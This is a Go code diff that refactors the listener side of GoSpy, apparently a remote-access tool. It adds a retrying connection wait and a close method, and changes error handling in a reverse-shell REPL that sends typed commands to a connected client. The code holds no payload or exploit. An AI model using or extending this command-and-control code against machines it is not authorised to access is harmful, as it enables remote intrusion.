@@ -11,24 +11,13 @@ import (
 
 // GoSpyClient represents a GoSpy client that is connected to this server.
 type GoSpyClient struct {
-	conn net.Conn
+	conn        net.Conn // The instantiated connection to the client.
+	bindAddress string   // The address to listen on for the inbound client connection.
 }
 
-// GetGoSpyClient starts a tcp server and waits for a single connection, returning a GoSpyClient that instantiated connection.
-func GetGoSpyClient(address string) (client GoSpyClient, err error) {
-	l, err := net.Listen("tcp", address)
-	if err != nil {
-		return GoSpyClient{}, err
-	}
-
-	defer l.Close() // Closing the server won't close the already established client connection.
-
-	conn, err := l.Accept()
-	if err != nil {
-		return GoSpyClient{}, err
-	}
-
-	return GoSpyClient{conn}, nil
+// NewGoSpyClient creates instantiates a GoSpyClient.
+func NewGoSpyClient(bindAddress string) (client GoSpyClient) {
+	return GoSpyClient{bindAddress: bindAddress}
 }
 
 // sendString sends a string to the client.
@@ -39,6 +28,28 @@ func (c GoSpyClient) sendString(message string) (err error) {
 // recvString receives a string from the client.
 func (c GoSpyClient) recvString() (message string, err error) {
 	return comms.RecvStringFrom(c.conn)
+}
+
+// CloseConn closes the conn.
+func (c GoSpyClient) CloseConn() (err error) {
+	return c.conn.Close()
+}
+
+// WaitForConn starts a tcp server and waits for a single successful connection.
+func (c *GoSpyClient) WaitForConn() (err error) {
+	l, err := net.Listen("tcp", c.bindAddress)
+	if err != nil {
+		return err
+	}
+	defer l.Close() // Closing the server won't close the already established client connection.
+
+	for {
+		conn, err := l.Accept()
+		if err == nil {
+			c.conn = conn
+			return nil
+		}
+	}
 }
 
 // Ping sends a "ping" to the client and waits for a "pong".
@@ -66,7 +77,7 @@ func (c GoSpyClient) EnterReverseShellRepl() (err error) {
 
 		err := c.sendString(text)
 		if err != nil {
-			fmt.Printf("Got error: %e\n", err)
+			return err
 		}
 
 		// Exit after sending exit to client.
@@ -76,7 +87,7 @@ func (c GoSpyClient) EnterReverseShellRepl() (err error) {
 
 		resp, err := c.recvString()
 		if err != nil {
-			fmt.Printf("Got error: %e\n", err)
+			return err
 		}
 
 		fmt.Println(resp)
